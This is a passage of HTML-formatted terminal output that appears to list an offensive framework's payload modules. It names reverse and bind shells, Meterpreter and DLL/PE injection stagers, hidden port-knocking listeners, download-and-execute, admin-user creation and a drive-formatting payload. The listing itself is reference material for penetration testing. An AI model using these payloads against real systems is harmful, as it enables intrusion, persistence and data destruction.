class="line">    solaris&#x2F;x86&#x2F;shell_find_port                         Spawn a shell on an established connection</span><br><span class="line">    solaris&#x2F;x86&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell</span><br><span class="line">    tty&#x2F;unix&#x2F;interact                                   Interacts with a TTY on an established socket connection</span><br><span class="line">    windows&#x2F;adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common co</span><br><span class="line">                                                        mplexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Com</span><br><span class="line">                                                        plexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit&#x2F;special)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP</span><br><span class="line">                                                        defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After tha</span><br><span class="line">                                                        t you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shellcode</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the a</span><br><span class="line">                                                        llowed host.</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection</span><br><span class="line">    windows&#x2F;dllinject&#x2F;bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;find_tag                          Inject a DLL via a reflective loader. Use an established connection</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must firs</span><br><span class="line">                                                        t upload data&#x2F;hop&#x2F;hop.php to the PHP server you wish to use as a hop.</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;dllinject&#x2F;reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)</span><br><span class="line">    windows&#x2F;dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload</span><br><span class="line">    windows&#x2F;download_exec                               Download an EXE from an HTTP(S)&#x2F;FTP URL and execute it</span><br><span class="line">    windows&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    windows&#x2F;format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the v</span><br><span class="line">                                                        olume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reas</span><br><span class="line">                                                        on, it skips the drive and proceeds to the next volume.</span><br><span class="line">    windows&#x2F;loadlibrary                                 Load an arbitrary library path</span><br><span class="line">    windows&#x2F;messagebox                                  Spawns a dialog via MessageBox using a customizable title, text &amp; icon</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_hidden_ipknock_tcp         Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will wor</span><br><span class="line">                                                        k as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode fro</span><br><span class="line">                                                        m any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shellcode</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_hidden_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection from a hidden port and spawn a command shell to the allowed host.</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_ipv6_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_named_pipe                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_nonx_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_tcp                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_tcp_rc4                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;bind_tcp_uuid                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;find_tag                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Use an established connection</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_hop_http                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data&#x2F;hop&#x2F;hop.php to the P</span><br><span class="line">                                                        HP server you wish to use as a hop.</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_http                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows wininet)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_http_proxy_pstore       Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_https                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTPS (Windows wininet)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_https_proxy             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP using SSL with custom proxy support</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_ipv6_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_named_pipe              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_nonx_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_ord_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp                     Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_allports            Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Try to connect back to the attacker, on all possible ports (1-65535, slowly)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_dns                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_rc4_dns             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_tcp_uuid                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_winhttp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTP (Windows winhttp)</span><br><span class="line">    windows&#x2F;meterpreter&#x2F;reverse_winhttps                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or new</span><br><span class="line">                                                        er. Tunnel communication over HTTPS (Windows winhttp)</span><br><span class="line">    windows&#x2F;meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.</span><br><span class="line">    windows&#x2F;metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    windows&#x2F;metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked fr</span><br><span class="line">                                                        om the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping).</span><br><span class="line">                                                         After that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the</span><br><span class="line">                                                        shellcode</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shel</span><br><span class="line">                                                        l to the allowed host.</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;find_tag                   Inject a custom DLL into the exploited process. Use an established connection</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535</span><br><span class="line">                                                        , slowly)</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupdllinject&#x2F;reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from t</span><br><span class="line">                                                        he IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). Aft</span><br><span class="line">                                                        er that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide the shel</span><br><span class="line">                                                        lcode</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to</span><br><span class="line">                                                         the allowed host.</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;find_tag                 Inject the meterpreter server DLL (staged). Use an established connection</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, sl</span><br><span class="line">                                                        owly)</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker</span><br><span class="line">    windows&#x2F;patchupmeterpreter&#x2F;reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_hidden_ipknock_tcp            Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection. First, the port will need to be knock</span><br><span class="line">                                                        ed from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hp</span><br><span class="line">                                                        ing). After that you could get your shellcode from any IP. The socket will appear as &quot;closed,&quot; thus helping to hide</span><br><span class="line">                                                         the shellcode</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_hidden_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection from a hidden port and spawn a command</span><br><span class="line">                                                         shell to the allowed host.</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_ipv6_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_ipv6_tcp_uuid                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for an IPv6 connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_named_pipe                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a pipe connection (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_nonx_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection (No NX)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_tcp                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_tcp_rc4                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection</span><br><span class="line">    windows&#x2F;peinject&#x2F;bind_tcp_uuid                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Listen for a connection with UUID Support (Windows x86)</span><br><span class="line">    windows&#x2F;peinject&#x2F;find_tag                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Use an established connection</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_ipv6_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker over IPv6</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_named_pipe                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker via a named pipe pivot</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_nonx_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker (No NX)</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_ord_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp                        Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_allports               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Try to connect back to the attacker, on all possible ports (1-</span><br><span class="line">                                                        65535, slowly)</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_dns                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_rc4                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently supported. Als</span><br><span class="line">                                                        o PE files which use resource loading might crash. . Connect back to the attacker</span><br><span class="line">    windows&#x2F;peinject&#x2F;reverse_tcp_rc4_dns                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader wi</span><br><span class="line">                                                        ll execute the pre-mapped PE image starting from the address of entry after performing image base relocation and AP</span><br><span class="line">                                                        I address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import</span><br><span class="line">                                                         table. PE files with CLR(C#&#x2F;.NET executables), bounded imports, and TLS callbacks are not currently 